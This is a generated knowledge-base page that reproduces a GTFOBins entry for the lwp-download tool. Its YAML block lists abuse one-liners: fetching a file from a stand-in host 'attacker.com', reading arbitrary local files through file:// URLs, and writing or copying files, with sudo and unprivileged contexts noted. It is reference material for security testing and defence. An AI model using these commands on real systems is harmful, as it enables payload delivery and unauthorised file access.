---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# lwp-download

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `lwp-download` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lwp-download` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [lwp-download](../../tools/linux/lwp-download.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | lwp-download |
| name | lwp-download |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/lwp-download/ |

## Preserved Source Material

```yaml
_body: ''
_name: lwp-download
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lwp-download
functions:
  download:
  - code: lwp-download http://attacker.com/path/to/input-file /path/to/output-file
    comment: The destination file `/path/to/output-file` can be omitted, in that case the file is saved to `input-file` in
      the current working directory.
    contexts:
      sudo: null
      unprivileged: null
  file-read:
  - code: lwp-download file:///path/to/input-file /dev/stdout
    contexts:
      sudo: null
      unprivileged: null
  file-write:
  - code: 'echo DATA >/path/to/temp-file

      lwp-download file:///path/to/temp-file /path/to/output-file'
    contexts:
      sudo: null
      unprivileged: null
  - code: lwp-download file:///path/to/input-file /path/to/output-file
    comment: This actually copies a file to a destination.
    contexts:
      sudo: null
      unprivileged: null
```
